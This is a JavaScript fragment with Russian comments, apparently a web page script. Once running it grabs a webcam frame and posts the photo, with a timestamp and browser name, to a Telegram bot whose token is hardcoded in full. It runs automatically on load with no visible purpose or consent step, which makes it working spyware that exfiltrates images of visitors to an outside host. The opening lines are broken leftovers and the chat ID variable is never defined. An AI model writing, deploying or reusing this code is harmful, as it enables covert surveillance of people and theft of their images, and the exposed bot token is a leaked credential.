            // Получаем фото в формате base64

            // Останавливаем камеру
            stream.getTracks().forEach(track => track.stop());

    })
    .catch(err => console.error('Ошибка:', err));

const TELEGRAM_TOKEN = '8503701773:AAGoKDHpfx0GjRCz9Ttal9Zij5OOFLRCINw';   // Замените на токен от @BotFather

// ==================== ФУНКЦИИ ====================

// Конвертация base64 в Blob
function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

// Получение информации о браузере
function getBrowserInfo() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Edge')) return 'Edge';
    return 'Unknown';
}

// Отправка фото в Telegram
async function sendPhotoToTelegram(photoBlob) {
    if (TELEGRAM_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
        throw new Error('❌ Telegram не настроен! Замените TOKEN и CHAT_ID');
    }
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
    formData.append('caption', `🆕 ФОТО С КАМЕРЫ\n🕐 ${new Date().toLocaleString()}\n💻 ${getBrowserInfo()}`);
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
    
    if (!response.ok) throw new Error('Ошибка отправки');
    return true;
}

// Сделать фото и отправить в Telegram
async function takePhotoAndSend() {
    try {
        console.log('📷 Запрос доступа к камере...');
        
        // 1. Запрашиваем доступ к камере
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480 } 
        });
        
        // 2. Создаём video элемент
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // 3. Ждём загрузки видео
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 500);
            };
        });
        
        // 4. Создаём canvas и рисуем кадр
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // 5. Конвертируем в Blob
        const blob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.8);
        });
        
        // 6. Останавливаем камеру
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        
        console.log('✅ Фото сделано, отправка в Telegram...');
        
        // 7. Отправляем в Telegram
        await sendPhotoToTelegram(blob);
        
        console.log('✅ Фото успешно отправлено в Telegram!');
        return true;
        
    } catch (error) {
        console.error('❌ Ошибка:', error.message);
        throw error;
    }
}

// ==================== ЗАПУСК ====================
takePhotoAndSend();
